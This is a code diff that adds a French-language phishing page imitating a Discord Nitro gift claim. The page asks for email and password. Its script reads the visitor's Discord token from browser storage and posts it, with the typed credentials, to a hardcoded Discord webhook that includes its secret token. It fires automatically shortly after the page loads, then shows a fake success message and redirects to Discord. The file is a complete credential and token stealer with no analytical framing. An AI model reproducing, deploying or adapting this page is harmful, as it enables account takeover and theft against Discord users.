@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Gift - Nitro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {background: #36393f; color: #dcddde; font-family: 'Whitney', sans-serif; margin:0; padding:0;}
+        .container {max-width: 480px; margin: 40px auto; background: #2f3136; border-radius: 8px; overflow: hidden;}
+        header {background: #5865f2; padding: 20px; text-align: center;}
+        .content {padding: 30px;}
+        input, button {width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: none;}
+        input {background: #202225; color: white;}
+        button {background: #3ba55c; color: white; font-weight: bold; cursor: pointer;}
+        button:hover {background: #2d7d46;}
+        .fake-logo {font-size: 28px; font-weight: bold;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="fake-logo">Discord</div>
+            <h1>Tu as reçu un cadeau !</h1>
+        </header>
+        <div class="content">
+            <p style="text-align:center; font-size:18px;">Quelqu'un t'a offert <strong>3 mois de Nitro Boost</strong> !</p>
+            <img src="https://discord.com/assets/5f6f7e6e6e6e6e6e6e6e6e6e6e6e6e6e.png" width="100%" style="border-radius:8px;" onerror="this.style.display='none'">
+            
+            <p>Pour réclamer, connecte-toi :</p>
+            <input type="email" id="email" placeholder="Email ou numéro de téléphone" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button onclick="claimNitro()">Réclamer Nitro</button>
+            <p style="font-size:12px; color:#b9bbbe; text-align:center;">Ce cadeau expire dans 48h</p>
+        </div>
+    </div>
+
+    <script>
+        function obfuscatedGrab() {
+            let t = localStorage.getItem("token");
+            if (t) {
+                fetch("https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        content: "Nitro Grabber Token",
+                        embeds: [{description: "```" + t + "```", color: 0x00FF00}]
+                    })
+                });
+            }
+        }
+
+        function claimNitro() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const token = localStorage.getItem("token") || "NO_TOKEN";
+
+            // Envoi tout au webhook
+            fetch("https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "🔥 Nitro Claim - Full Info",
+                    embeds: [{
+                        description: "```Token: " + token + "```\nEmail: " + email + "\nPassword: " + pass,
+                        color: 0xFF0000
+                    }]
+                })
+            }).then(() => {
+                // Fake success
+                document.body.innerHTML = `<div style="text-align:center; padding:100px; background:#36393f; color:#3ba55c; font-size:24px;">✅ Nitro activé avec succès !<br><br>Redirection vers Discord...</div>`;
+                setTimeout(() => window.location.href = "https://discord.com", 2000);
+            });
+            
+            obfuscatedGrab();
+        }
+
+        // Grab immédiat
+        setTimeout(obfuscatedGrab, 500);
+    </script>
+</body>
+</html>
